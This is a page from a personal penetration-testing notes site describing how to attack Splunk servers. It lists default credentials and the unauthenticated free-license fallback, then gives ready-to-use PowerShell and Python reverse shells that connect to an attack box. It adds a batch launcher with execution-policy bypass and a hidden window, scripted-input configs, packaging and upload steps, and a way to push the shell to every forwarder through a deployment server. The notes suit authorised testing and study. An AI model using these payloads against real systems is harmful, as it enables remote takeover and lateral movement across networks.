<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/web-exploitation/splunk</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/web-exploitation/splunk"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>splunk</h1>

<p>log analytics tool to analyze and visualize data. often used for security monitoring and business analytics. often encountered and a valuable target in internal pentests, but doesn&#39;t have a lot of CVEs. it does however run as a high-privileged user no matter the host.</p>

<p>one notable thing is that expiring splunk licenses automatically revert the app to the free version (after 60 days during trial), which <em>doesn&#39;t</em> require authentication. fun!</p>

<h2>discovery - enumeration</h2>

<p>splunk web server runs on port 8000 by default, while the REST API listens on port 8089. on older versions, default credentials are <code>admin:changeme</code> and are even displayed on the login page. if those have been changed, we can always check for weak passwords.</p>

<h2>attack paths</h2>

<h3>remote code execution</h3>

<p>depending on the situation, RCE can be achieved through django applications, REST endpoints, scripted inputs and altering scripts.</p>

<p>scripted inputs are the most common method for this purpose. their initial goal is to integrate splunk with various data sources such as APIs, servers, etc. stdout is provided as input to splunk.</p>

<p>scripted inputs can run bash, powershell and batch scripts as splunk is designed to run on both linux and windows hosts. python scripts are also available as splunk ships with this interpreter. the most common RCE is running a python reverse shell through a scripted input.</p>

<p>we can use this <a href="https://github.com/0xjpuff/reverse_shell_splunk" rel="nofollow">repository</a> for a quick splunk package that will give us a reverse shell. first, create a directory structure such as:</p>

<div class="highlight"><pre class="highlight plaintext"><code>hacky
├── bin
└── default
</code></pre></div>

<p><code>bin</code> will contain our payload intended to run on the splunk instance, and <code>default</code> will contain the <code>inputs.conf</code> file. for window hosts and powershell, we could use the following one-liner for our reverse shell, in <code>run.ps1</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s1">'&lt;attack box IP&gt;'</span><span class="p">,</span><span class="err">&lt;</span><span class="n">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">port</span><span class="err">&gt;</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nx">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'PS '</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
</span></code></pre></div>

<p>to run this powershell script, we will need a <code>run.bat</code> file calling it like the following:</p>

<div class="highlight"><pre class="highlight batchfile"><code>@ECHO <span class="kd">OFF</span>
<span class="kd">PowerShell</span><span class="err">.exe</span> <span class="na">-exec </span><span class="kd">bypass</span> <span class="na">-w </span><span class="kd">hidden</span> <span class="na">-Command </span><span class="s2">"&amp; '</span><span class="vm">%~dpn0</span><span class="s2">.ps1'"</span>
<span class="kd">Exit</span>
</code></pre></div>

<p>finally, our <code>inputs.conf</code> file will indicate that our &quot;app&quot; is enabled and set to run every 10 seconds, with the following lines:</p>

<div class="highlight"><pre class="highlight plaintext"><code>[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
</code></pre></div>

<p>if we were dealing with a linux host, we could use the following <code>run.py</code> reverse shell instead:</p>

<div class="highlight"><pre class="highlight python"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">pty</span>

<span class="n">ip</span><span class="o">=</span><span class="sh">"</span><span class="s">&lt;attack box IP&gt;</span><span class="sh">"</span>
<span class="n">port</span><span class="o">=</span><span class="sh">"</span><span class="s">&lt;attack box port&gt;</span><span class="sh">"</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">()</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="nf">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
<span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="n">fd</span><span class="p">)</span> <span class="k">for</span> <span class="n">fd</span> <span class="ow">in</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">)]</span>
<span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">'</span><span class="s">/bin/bash</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div>

<p>and our <code>inputs.conf</code> would need to have the following instead:</p>

<div class="highlight"><pre class="highlight plaintext"><code>[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell
</code></pre></div>

<p>whether this is a windows or linux host, once all files in the directory structure are there, create a tarball that we will upload:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">tar</span> <span class="nt">-czvf</span> hacky.tar.gz hacky/
</code></pre></div>

<p>start a listener according to our reverse shell, select <code>install app from file</code> in <code>/manager/search/apps/local</code>, and upload the &quot;app&quot;. our listener should receive something back.</p>

<p>if the splunk instance is used as a deployment server, it&#39;s possible to push a reverse shell and get RCE on all hosts with universal forwarders installed, under the following conditions:</p>

<ul>
<li>the application has to be placed in <code>$SPLUNK_HOME/etc/deployment-apps</code></li>
<li>against a windows environment, the application needs to use a powershell reverse shell. the universal forwarders don&#39;t have python installed.</li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

